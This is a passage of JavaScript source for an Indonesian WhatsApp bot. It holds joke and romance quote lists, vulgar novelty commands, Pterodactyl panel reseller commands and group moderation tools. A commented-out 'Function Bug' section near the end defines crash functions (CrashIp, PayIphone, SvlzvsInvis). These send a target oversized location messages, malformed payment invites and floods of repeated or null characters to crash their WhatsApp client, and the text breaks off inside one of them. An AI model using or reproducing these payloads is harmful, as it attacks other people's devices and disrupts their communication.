    "Cinta itu kaya hukuman mati. Kalau nggak ditembak, ya digantung.",
    "Mencintaimu itu kayak narkoba: sekali coba jadi candu, gak dicoba bikin penasaran, ditinggalin bikin sakaw.",
    "Gue paling suka ngemil karena ngemil itu enak. Apalagi ngemilikin kamu sepenuhnya...",
    "Dunia ini cuma milik kita berdua. Yang lainnya cuma ngontrak.",
    "Bagi aku, semua hari itu adalah hari Selasa. Selasa di Surga bila dekat denganmu...",
    "Bagaimana kalau kita berdua jadi komplotan penjahat? Aku curi hatimu dan kamu curi hatiku.",
    "Kamu itu seperti kopi yang aku seruput pagi ini. Pahit, tapi bikin nagih.",
    "Aku sering cemburu sama lipstikmu. Dia bisa nyium kamu tiap hari, dari pagi sampai malam.",
    "Hanya mendengar namamu saja sudah bisa membuatku tersenyum seperti orang bodoh.",
    "Aku tau teman wanitamu bukan hanya satu, dan menyukaimu pun bukan hanya aku.",
    "Semenjak aku berhenti berharap pada dirimu, aku jadi tidak semangat dalam segala hal..",
    "Denganmu, jatuh cinta adalah patah hati paling sengaja.",
    "Sangat sulit merasakan kebahagiaan hidup tanpa kehadiran kamu disisiku.",
    "Melalui rasa rindu yang bergejolak dalam hati, di situ terkadang aku sangat membutuhkan dekap peluk kasih sayangmu.",
    "Sendainya kamu tahu, sampai saat ini aku masih mencintaimu.",
    "Terkadang aku iri sama layangan..talinya putus saja masih dikejar kejar dan gak rela direbut orang lain...",
    "Aku tidak tahu apa itu cinta, sampai akhirnya aku bertemu denganmu. Tapi, saat itu juga aku tahu rasanya patah hati.",
    "Mengejar itu capek, tapi lebih capek lagi menunggu\nMenunggu kamu menyadari keberadaanku...",
    "Jangan berhenti mencinta hanya karena pernah terluka. Karena tak ada pelangi tanpa hujan, tak ada cinta sejati tanpa tangisan.",
    "Aku punya sejuta alasan unutk melupakanmu, tapi tak ada yang bisa memaksaku untuk berhenti mencintaimu.",
    "Terkadang seseorang terasa sangat bodoh hanya untuk mencintai seseorang.",
    "Kamu adalah patah hati terbaik yang gak pernah aku sesali.",
    "Bukannya tak pantas ditunggu, hanya saja sering memberi harapan palsu.",
    "Sebagian diriku merasa sakit, Mengingat dirinya yang sangat dekat, tapi tak tersentuh.",
    "Hal yang terbaik dalam mencintai seseorang adalah dengan diam-diam mendo akannya.",
    "Kuharap aku bisa menghilangkan perasaan ini secepat aku kehilanganmu.",
    "Demi cinta kita menipu diri sendiri. Berusaha kuat nyatanya jatuh secara tak terhormat.",
    "Anggaplah aku rumahmu, jika kamu pergi kamu mengerti kemana arah pulang. Menetaplah bila kamu mau dan pergilah jika kamu bosan...",
    "Aku bingung, apakah aku harus kecewa atu tidak? Jika aku kecewa, emang siapa diriku baginya?\n\nKalau aku tidak kecewa, tapi aku menunggu ucapannya.",
    "Rinduku seperti ranting yang tetap berdiri.Meski tak satupun lagi dedaunan yang menemani, sampai akhirnya mengering, patah, dan mati.",
    "Kurasa kita sekarang hanya dua orang asing yang memiliki kenangan yang sama.",
    "Buatlah aku bisa membencimu walau hanya beberapa menit, agar tidak terlalu berat untuk melupakanmu.",
    "Aku mencintaimu dengan segenap hatiku, tapi kau malah membagi perasaanmu dengan orang lain.",
    "Mencintaimu mungkin menghancurkanku, tapi entah bagaimana meninggalkanmu tidak memperbaikiku.",
    "Kamu adalah yang utama dan pertama dalam hidupku. Tapi, aku adalah yang kedua bagimu.",
    "Jika kita hanya bisa dipertemukan dalam mimpi, aku ingin tidur selamanya.",
    "Melihatmu bahagia adalah kebahagiaanku, walaupun bahagiamu tanpa bersamaku.",
    "Aku terkadang iri dengan sebuah benda. Tidak memiliki rasa namun selalu dibutuhkan. Berbeda dengan aku yang memiliki rasa, namun ditinggalkan dan diabaikan...",
    "Bagaimana mungkin aku berpindah jika hanya padamu hatiku bersinggah?",
    "Kenangan tentangmu sudah seperti rumah bagiku. Sehingga setiap kali pikiranku melayang, pasti ujung-ujungnya akan selalu kembali kepadamu.",
    "Kenapa tisue bermanfaat? Karena cinta tak pernah kemarau. - Sujiwo Tejo",
    "Kalau mencintaimu adalah kesalahan, yasudah, biar aku salah terus saja.",
    "Sejak kenal kamu, aku jadi pengen belajar terus deh. Belajar jadi yang terbaik buat kamu.",
    "Ada yang bertingkah bodoh hanya untuk melihatmu tersenyum. Dan dia merasa bahagia akan hal itu.",
    "Aku bukan orang baik, tapi akan belajar jadi yang terbaik untuk kamu.",
    "Kita tidak mati, tapi lukanya yang membuat kita tidak bisa berjalan seperti dulu lagi.",
    "keberadaanmu bagaikan secangkir kopi yang aku butuhkan setiap pagi, yang dapat mendorongku untuk tetap bersemangat menjalani hari.",
    "Aku mau banget ngasih dunia ke kamu. Tapi karena itu nggak mungkin, maka aku akan kasih hal yang paling penting dalam hidupku, yaitu duniaku.",
    "Mending sing humoris tapi manis, ketimbang sok romantis tapi akhire tragis.",
    "Ben akhire ora kecewa, dewe kudu ngerti kapan waktune berharap lan kapan kudu mandeg.",
    "Aku ki wong Jowo seng ora ngerti artine 'I Love U'. Tapi aku ngertine mek 'Aku tresno awakmu'.",
    "Ora perlu ayu lan sugihmu, aku cukup mok setiani wes seneng ra karuan.",
    "Cintaku nang awakmu iku koyok kamera, fokus nang awakmu tok liyane mah ngeblur.",
    "Saben dino kegowo ngimpi tapi ora biso nduweni.",
    "Ora ketemu koe 30 dino rasane koyo sewulan.",
    "Aku tanpamu bagaikan sego kucing ilang karete. Ambyar.",
    "Pengenku, Aku iso muter wektu. Supoyo aku iso nemokne kowe lewih gasik. Ben Lewih dowo wektuku kanggo urip bareng sliramu.",
    "Aku ora pernah ngerti opo kui tresno, kajaba sak bare ketemu karo sliramu.",
    "Cinta aa ka neng moal leungit-leungit sanajan aa geus kawin deui.",
    "Kasabaran kaula aya batasna, tapi cinta kaula ka anjeun henteu aya se epna.",
    "Kanyaah akang moal luntur najan make Bayclean.",
    "Kenangan endah keur babarengan jeung anjeun ek tuluy diinget-inget nepi ka poho.",
    "Kuring moal bakal tiasa hirup sorangan, butuh bantosan jalmi sejen.",
    "Nyaahna aa ka neg teh jiga tukang bank keur nagih hutang (hayoh mumuntil).",
    "Kasabaran urang aya batasna, tapi cinta urang ka maneh moal aya beakna.",
    "Hayang rasana kuring ngarangkai kabeh kata cinta anu aya di dunya ieu, terus bade ku kuring kumpulkeun, supaya anjeun nyaho gede pisan rasa cinta kuring ka anjeun.",
    "Tenang wae neng, ari cinta Akang mah sapertos tembang krispatih; Tak lekang oleh waktu.",
    "Abdi sanes jalmi nu sampurna pikeun anjeun, sareng sanes oge nu paling alus kanggo anjeun. Tapi nu pasti, abdi jalmi hiji-hijina nu terus emut ka anjeun.",
    "Cukup jaringan aja yang hilang, kamu jangan.",
    "Sering sih dibikin makan ati. Tapi menyadari kamu masih di sini bikin bahagia lagi.",
    "Musuhku adalah mereka yang ingin memilikimu juga.",
    "Banyak yang selalu ada, tapi kalo cuma kamu yang aku mau, gimana?",
    "Jam tidurku hancur dirusak rindu.",
    "Cukup China aja yang jauh, cinta kita jangan.",
    "Yang penting itu kebahagiaan kamu, aku sih gak penting..",
    "Cuma satu keinginanku, dicintai olehmu..",
    "Aku tanpamu bagaikan ambulans tanpa wiuw wiuw wiuw.",
    "Cukup antartika aja yang jauh. Antarkita jangan."
]
const Hazazeltruth = bucin[Math.floor(Math.random() * bucin.length)]
	payreply(`${Hazazeltruth}`)
}
break
case 'quotesbacot': {
function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}

const bacot = [
'Kamu suka kopi nggak? Aku sih suka. Tau kenapa alesannya? Kopi itu ibarat kamu, pahit sih tapi bikin candu jadi pingin terus.',
'Gajian itu kayak mantan ya? Bisanya cuman lewat sebentar saja.',
'Kata pak haji, cowok yang nggak mau pergi Sholat Jumat disuruh pakai rok aja.',
'Kamu tahu mantan nggak? Mantan itu ibarat gajian, biasa numpang lewat dong di kehidupan kita.',
'Aku suka kamu, kamu suka dia, tapi dia sayangnya nggak ke kamu. Wkwkw lucu ya? Cinta serumit ini.',
'Google itu hebat ya? Tapi sayang sehebat-hebatnya Google nggak bisa menemukan jodoh kita.',
'Terlalu sering memegang pensil alis dapat membuat mata menjadi buta, jika dicolok-colokkan ke mata.',
'Saya bekerja keras karena sadar kalau uang nggak punya kaki buat jalan sendiri ke kantong saya.',
'Jika kamu tak mampu meyakinkan dan memukau orang dengan kepintaranmu, bingungkan dia dengan kebodohanmu.',
'Selelah-lelahnya bekerja, lebih lelah lagi kalau nganggur.',
'Kita hidup di masa kalau salah kena marah, pas bener dibilang tumben.',
'Nggak ada bahu pacar? Tenang aja, masih ada bahu jalan buat nyandar.',
'Mencintai dirimu itu wajar, yang gak wajar mencintai bapakmu.',
'Katanya enggak bisa bohong. Iyalah, mata kan cuma bisa melihat.',
'Madu di tangan kananmu, racun di tangan kirimu, jodoh tetap di tangan tuhan.',
'Selingkuh terjadi bukan karena ada niat, selingkuh terjadi karna pacar kamu masih laku.',
'Netizen kalau senam jempol di ponsel nggak pakai pendinginan, pantes komennya bikin panas terus.',
'Jodoh memang enggak kemana, tapi saingannya ada dimana-mana.',
'Perasaan aku salah terus di matamu. Kalu gitu, besok aku pindah ke hidungmu.',
'Jomblo tidak perlu malu, jomblo bukan berarti tidak laku, tapi memang tidak ada yang mau.',
'Jika doamu belum terkabul maka bersabar, ingatlah bahwa yang berdoa bukan cuma kamu!',
'Masih berharap dan terus berharap lama-lama aku jadi juara harapan.',
'Manusia boleh berencana, tapi akhirnya saldo juga yang menentukan.',
'Statusnya rohani, kelakuannya rohalus.',
'Kegagalan bukan suatu keberhasilan.',
'Tadi mau makan bakso, cuma kok panas banget, keliatannya baksonya lagi demam.',
'Aku juga pernah kaya, waktu gajian.',
'Aku diputusin sama pacar karena kita beda keyakinan. Aku yakin kalau aku ganteng, tapi dia enggak.',
'Masa depanmu tergantung pada mimpimu, maka perbanyaklah tidur.',
'Seberat apapun pekerjaanmu, akan semakin ringan jika tidak dibawa.',
'Jangan terlalu berharap! nanti jatuhnya sakit!',
'Ingat! Anda itu jomblo',
'Gak tau mau ngetik apa',
]
    let bacotan = pickRandom(bacot)
  payreply(bacotan)
}
break
                
case "cekganteng": {
if (!args[0]) return payreply('NAMA LU MANA??')
const ganteng = [
"cuman 10% doang", "20% kurang ganteng soal nya", "0% karna nggak ganteng", "30% mayan gantengg", "40% ganteng", "50%Otw cari janda😎", "60% Orang Ganteng", "70%Ganteng bet","80% gantengggg parah","90% Ganteng idaman ciwi ciwi","100% Ganteng Bgt bjirr"]
const hasil = ganteng[Math.floor(Math.random() * ganteng.length)]
const teks = `𝗧𝗲𝗿𝗻𝘆𝗮𝘁𝗮 *${args[0]}* *${hasil}*
`
payreply(teks)
}
break

case 'cekkhodam': case 'cekkodam': {
if (!text) return payreply('nama siapa yang mau di cek khodam nya')
function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}

const khodam = [
"Kulkas 2 pintu",
"Kumis lele",
"Kumis Lele",
"Lemari dua Pintu",
"Kacang Hijau",
"Kulkas mini",
"Burung beo",
"Air",
"Api",
"Batu",
"Magnet",
"Sempak",
"Botol Tupperware",
"Badut Mixue",
"Sabun GIV",
"Sandal Swallow",
"Jarjit",
"Ijat",
"Fizi",
"Mail",
"Ehsan",
"Upin",
"Ipin",
"sungut lele",
"Tok Dalang",
"Opah",
"Opet",
"Alul",
"Pak Vinsen",
"Maman Resing",
"Pak RT",
"Admin ETI",
"Bung Towel",
"Lumpia Basah",
"Bjorka",
"Hacker",
"Martabak Manis",
"Baso Tahu",
"Tahu Gejrot",
"Dimsum",
"Seblak",
"Aromanis",
"Gelembung sabun",
"Kuda",
"Seblak Ceker",
"Telor Gulung",
"Tahu Aci",
"Tempe Mendoan",
"Nasi Kucing",
"Kue Cubit",
"Tahu Sumedang",
"Nasi Uduk",
"Wedang Ronde",
"Kerupuk Udang",
"Cilok",
"Cilung",
"Kue Sus",
"Jasuke",
"Seblak Makaroni",
"Sate Padang",
"Sayur Asem",
"Kromboloni",
"Marmut Pink",
"Belalang Mullet",
"Kucing Oren",
"Lintah Terbang",
"Singa Paddle Pop",
"Macan Cisewu",
"Vario Mber",
"Beat Mber",
"Supra Geter",
"Oli Samping",
"Knalpot Racing",
"Jus Stroberi",
"Jus Alpukat",
"Alpukat Kocok",
"Es Kopyor",
"Es Jeruk",
"@whiskeysockets/baileys",
"chalk",
"gradient-string",
"@adiwajshing",
"d-scrape",
"undefined",
"cannot read properties",
"performance-now",
"os",
"node-fetch",
"form-data",
"axios",
"util",
"fs-extra",
"scrape-primbon",
"child_process",
"emoji-regex",
"check-disk-space",
"perf_hooks",
"moment-timezone",
"cheerio",
"fs",
"process",
"require( . . . )",
"import ... from ...",
"rate-overlimit",
"Cappucino Cincau",
"Jasjus Melon",
"Teajus Apel",
"Pop ice Mangga",
"Teajus Gulabatu",
"Air Selokan",
"Air Kobokan",
"TV Tabung",
"Keran Air",
"Tutup Panci",
"Kotak Amal",
"Tutup Termos",
"Tutup Botol",
"Kresek Item",
"Kepala Casan",
"Ban Serep",
"Kursi Lipat",
"Kursi Goyang",
"Kulit Pisang",
"Warung Madura",
"Gorong-gorong",
]
    let kdm = pickRandom(khodam)
    const kodamn = `*Khodam ${text} adalah:* ${kdm}`
  payreply(kodamn)
}
break

case "cekkontol": case "kontol": {
if (!q) return m.reply(`Ketik Nama Yang Mau Di Cek.
Example : 
${prefix+command} Rizky`)

	const khodam = [
    `adaa woy tapi kecil punya nya si ${q}\nahh mana sedap`,
    `gak ada jir aowkwkwk\nwoyy kontol si ${q} gada aowkwk`,
	]
const kodam = khodam[Math.floor(Math.random() * khodam.length)]

	const respons = `
 °「 *CEK KONTOL* 」°

 • *Nama :* ${q}
 • *Kontol :* ${kodam}
	  `
  
	m.reply(respons)
  }
break
            case 's': 
            case 'sticker': 
            case 'stiker': {  
                
                if (/image/.test(mime)) {
                    let media = await quoted.download();
                    let encmedia = await Ikyy.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author });
                } else if (/video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 11) {
                        return payreply(`Reply Gambar Dengan Keterangan/Caption ${prefix+command}\nJika Media Yang Ingin Dijadikan Sticker Adalah Video, Batas Maksimal Durasi Video 1-9 Detik`);
                    }
                    let media = await quoted.download();
                    let encmedia = await Ikyy.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author });
                } else {
                    payreply(`Reply Gambar Dengan Keterangan/Caption ${prefix+command}\nDurasi Video 1-9 Detik`);
                }
            }
            break


            
////===========================================       
  // Cpanel Menu //
//============================================             
// ======== ! CPANEL MENU
case "listadmin": {
if (!isCreator) return payreply(mess.owner)
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
var teks = "\n *#- List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await Ikyy.sendMessage(m.chat, {text: teks}, {quoted: m})
}
break

//================================================================================
case "listpanel": case "listp": case "listserver": {
if (!isCreator) return payreply(mess.owner)
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
let messageText = "\n *#- List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}
await Ikyy.sendMessage(m.chat, {text: messageText}, {quoted: m})
}
break

//================================================================================

case "deladmin": {
if (!isCreator) return payreply(mess.owner)
if (!text) return payreply(example("idnya"))
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domain + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("Akun admin panel tidak ditemukan!")
await m.reply(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
}
break

//================================================================================

case "delpanel": {
if (!isCreator) return payreply(mess.owner)
if (!text) return payreply(example("idnya"))
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return m.reply("Server panel tidak ditemukan!")
m.reply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break

case "1gb": case "2gb": case "3gb": case "4gb": case "5gb": case "6gb": case "7gb": case "8gb": case "9gb": case "10gb": case "unlimited": case "unli": {
if (!isCreator && !isReseller) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gb") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `
 *Detail Akun Panel:*  

- *ID Server:* ${server.id}  
- *Nama:* ${name}  
- *Username:* ${user.username}  
- *Password:* ${password}  
- *Login:* ${global.domain}  
- *RAM:* ${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}  
 *CPU:* ${cpu == "0" ? "Unlimited" : cpu+"%"}  
- *Disk:* ${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}  

`;
await Ikyy.sendMessage(orang, {text: teks}, {quoted: m})
delete global.panel
}
break

case "cadmin": {
if (!isCreator) return payreply(mess.owner)
if (!text) return payreply(example("username"))
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await payreply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID User :* ${user.id}
* *Nama :* ${user.first_name}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Login :* ${global.domain}

*Rules Admin Panel ⚠️*
* Jangan Maling SC, Ketahuan Maling ? Auto Delete Akun & No Reff!!
* Simpan Baik² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Garansi Aktif 10 Hari
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await Ikyy.sendMessage(orang, {text: teks}, {quoted: m})
}
break
/*
case "addrespanel": case "addreseller": {
if (!isCreator) return payreply(mess.owner)
if (!text && !m.quoted) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || reseller.includes(input) || input === botNumber) return payreply(`Nomor ${input2} sudah menjadi reseller!`)
reseller.push(input)
await fs.writeFileSync("./database/reseller.json", JSON.stringify(reseller, null, 2))
payreply(`Berhasil menambah reseller ✅`)
}
break

case "delrespanel": case "delreseller": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 == global.owner || input == botNumber) return m.reply(`Tidak bisa menghapus reseller owner!`)
if (!reseller.includes(input)) return payreply(`Nomor ${input2} bukan user reseller!`)
let posi = reseller.indexOf(input)
await reseller.splice(posi, 1)
await fs.writeFileSync("./database/reseller.json", JSON.stringify(reseller, null, 2))
payreply(`Berhasil menghapus reseller ✅`)
}
break
*/

        case "addres":{
           
if (!isCreator) return payreply(mess.owner)
if (!args[0]) return payreply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62838072690`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await Ikyy.onWhatsApp(prrkek)
if (ceknya.length == 0) return payreply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp Yah Kontol!!!`)
premium.push(prrkek)
fs.writeFileSync("./Connection/database/reseller.json", JSON.stringify(premium))
payreply(`Nomor ${prrkek} Telah Menjadi Reseller Panel`)
}
break
        case "delres":{

if (!isCreator) return payreply(mess.owner)
if (!args[0]) return payreply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628388072690`)
bro = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = premium.indexOf(bro)
premium.splice(unp, 1)
fs.writeFileSync("./Connection/database/reseller.json", JSON.stringify(premium))
payreply(`Nomor ${bro} Telah Di Hapus Dari Reseller Panel`)
}
break


                case "kick":
            case "kik":
            case "dor": {
                if (!m?.isGroup) return payreply(mess.group)
                if (!isAdmins) return payreply(mess.admin)
                if (!isBotAdmins) return payreply(mess.botAdmin)
                if (!text && !m?.quoted) return payreply(`reply/tag orang nya`)
                let users = m?.quoted ? m?.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await Ikyy.groupParticipantsUpdate(m?.chat, [users], 'remove').catch(console.log)
            }
                break
            case "hidetag": {
                if (!m.isGroup) return payreply(mess.group)
                if (!isAdmins && !isCreator) return payreply(mess.admin)
 if (!q) return Reply(`Teks?`);
                if (m.quoted) {
                    Ikyy.sendMessage(m.chat, {
                        forward: m.quoted.fakeObj,
                        mentions: participants.map(a => a.id)
                    })
                }
                if (!m.quoted) {
                    Ikyy.sendMessage(m.chat, {
                        text: q ? q : '',
                        mentions: participants.map(a => a.id)
                    }, { quoted: qkontak })
                }
            }
            break
            case "tagall": {
if (!m.isGroup) return payreply(mess.group)
if (!isCreator && !m.isAdmin) return payreply(mess.admin)
if (!text) return payreply("teks?")
let teks = text+"\n\n"
let member = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
await member.forEach((e) => {
teks += `@${e.split("@")[0]}\n`
})
await Ikyy.sendMessage(m.chat, {text: teks, mentions: [...member]}, {quoted: m})
}
break;

case 'open':
            case 'buka': {
                if (!m.isGroup) return payreply(mess.group)
                if (!isAdmins && !isCreator) return payreply(mess.admin)
                if (!isBotAdmins) return payreply(mess.botAdmin)
                Ikyy.groupSettingUpdate(m.chat, 'not_announcement')
                payreply(`sukses mengizinkan semua peserta dapat mengirim pesan ke grup ini`)
            }
                break

            case 'close':
            case 'tutup': {
                if (!m.isGroup) return payreply(mess.group)
                if (!isAdmins && !isCreator) return payreply(mess.admin)
                if (!isBotAdmins) return payreply(mess.botAdmin)
                Ikyy.groupSettingUpdate(m.chat, 'announcement')
                payreply(`sukses mengizinkan hanya admin yang dapat mengirim pesan ke grup ini`)
            }
                break
//==========================        
  // Function Bug //
//============================================ 
/*
async function CrashIp(Ikyy, target) {
    try {
        await Ikyy.relayMessage(target, {
            locationMessage: {
                degreesLatitude: 2.9990000000,
                degreesLongitude: -2.9990000000,
                name: "Hola\n" + "𑇂𑆵𑆴𑆿饝喛".repeat(80900),
                url: `https://Wa.me/stickerpack/Depay`
            }
        }, {
            participant: {
                jid: target
            }
        });
    } catch (error) {
        console.error("Error Sending Bug:", error);
    }
}

async function CrashIpV2(Ikyy, target) {
    try {
        await Ikyy.relayMessage(target, {
            locationMessage: {
                degreesLatitude: 2.9990000000,
                degreesLongitude: -2.9990000000,
                name: "Hola\n" + "𑇂𑆵𑆴𑆿饝喛".repeat(80900),
                url: "https://" + "𑇂𑆵𑆴𑆿".repeat(1817) + ".com"
            }
        }, {
            participant: {
                jid: target
            }
        });
    } catch (error) {
        console.error("Error Sending Bug:", error);
    }
}

async function PayIphone(Ikyy, target) {
    await Ikyy.relayMessage(
        target, {
            paymentInviteMessage: {
                serviceType: "FBPAY",
                expiryTimestamp: Math.floor(Math.random() * -20000000),
            },
        }, {
            participant: {
                jid: target,
            },
        }
    );
}

async function SvlzvsInvis(Ikyy, target) {
var xts = { url: "https://l.top4top.io/p_3552yqrjh1.jpg" }
const imagePayload = {
  viewOnceMessage: {
    message: {
      interactiveResponseMessage: {
        body: {
          text: " 𐌕𐌆𐌄 ★ 𐌓𐌉𐌕𐌂𐌆𐌉𐌄🧬 ", 
          format: "DEFAULT",
        },
        nativeFlowResponseMessage: {
          name: "call_permission_request",
          paramsJson: "\u0000".repeat(1000000),
          version: 3,
        },
      },
      contextInfo: {
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from(
